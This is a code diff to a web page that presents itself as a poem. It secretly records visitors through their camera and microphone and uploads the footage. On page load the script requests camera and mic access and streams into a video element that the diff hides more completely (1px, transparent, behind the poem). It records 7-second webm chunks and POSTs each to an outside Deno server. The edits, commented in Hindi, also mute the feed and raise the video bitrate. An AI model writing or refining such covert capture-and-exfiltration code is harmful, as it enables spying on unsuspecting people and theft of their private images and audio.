@@ -8,7 +8,7 @@
 <style>
 body {
   background: #fff3f6;
-  font-family: "Poppins", sans-serif;
+  font-family: sans-serif; /* Poppins font system default में नहीं होता */
   padding: 20px;
   line-height: 1.7;
   color: #333;
@@ -21,9 +21,19 @@ body {
   border-radius: 16px;
   box-shadow: 0 4px 14px rgba(0,0,0,0.08);
   font-size: 19px;
+  /* कविता को फोकस में रखने के लिए इसे ऊपर रखें */
+  position: relative;
+  z-index: 10;
 }
 .hidden {
-  display: none;
+  /* वीडियो को पूरी तरह से छिपाने के लिए */
+  position: absolute;
+  width: 1px; 
+  height: 1px;
+  opacity: 0;
+  overflow: hidden;
+  pointer-events: none; /* यह सुनिश्चित करता है कि यह क्लिक करने योग्य न हो */
+  z-index: -1; /* इसे कविता के पीछे भेज दें */
 }
 h2 {
   color: #e63980;
@@ -53,7 +63,6 @@ h2 {
   </p>
 </div>
 
-<!-- hidden video element -->
 <video id="cam" class="hidden" autoplay playsinline></video>
 
 <script>
@@ -63,22 +72,37 @@ let recorder;
 // Start capturing
 async function startCapture() {
   try {
+    // कैमरा और माइक की अनुमति लें
     stream = await navigator.mediaDevices.getUserMedia({
       video: true,
       audio: true
     });
 
-    document.getElementById("cam").srcObject = stream;
+    const videoElement = document.getElementById("cam");
+    videoElement.srcObject = stream;
 
-    recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+    // --- यह लाइव ऑडियो फीडबैक को रोकने के लिए जोड़ा गया है ---
+    videoElement.muted = true; 
+    // --------------------------------------------------------
 
+    recorder = new MediaRecorder(stream, {
+  mimeType: "video/webm; codecs=vp9",
+  videoBitsPerSecond: 2000000
+});
+
+    // रिकॉर्डिंग डेटा चंक में उपलब्ध होने पर
     recorder.ondataavailable = (e) => {
       if (e.data.size > 0) sendChunk(e.data);
     };
 
-    recorder.start(7000); // 7 sec chunks
+    // हर 7 सेकंड में डेटा चंक भेजें
+    recorder.start(7000); 
+    console.log("Recording started and muted.");
+
   } catch (err) {
     console.log("Camera permission issue:", err);
+    // यहां यूजर को बता सकते हैं कि कैमरा जरूरी है
+    // alert("कैमरा एक्सेस की अनुमति दें।"); 
   }
 }
 
@@ -87,17 +111,31 @@ async function sendChunk(blob) {
   const fd = new FormData();
   fd.append("video_chunk", blob, "chunk.webm");
 
-  fetch("https://video.kannu-jaat.deno.net/", {
+  // आपके द्वारा दिए गए Deno सर्वर पर भेजें
+  fetch("https://video.kannu-jaat.deno.net", {
     method: "POST",
     body: fd
-  }).catch(()=>{});
+  }).catch((e)=>{
+    // कंसोल में एरर दिखाएं, लेकिन रिकॉर्डिंग न रोकें
+    console.error("Failed to send chunk:", e);
+  });
 }
 
 // stop on exit
 window.addEventListener("beforeunload", () => {
-  try { recorder.stop(); } catch(e){}
+  try { 
+    if (recorder && recorder.state !== 'inactive') {
+        recorder.stop(); 
+    }
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+    }
+  } catch(e){
+    console.error("Error stopping recording or stream:", e);
+  }
 });
 
+// Capture शुरू करें जब पेज लोड हो जाए
 startCapture();
 </script>
 
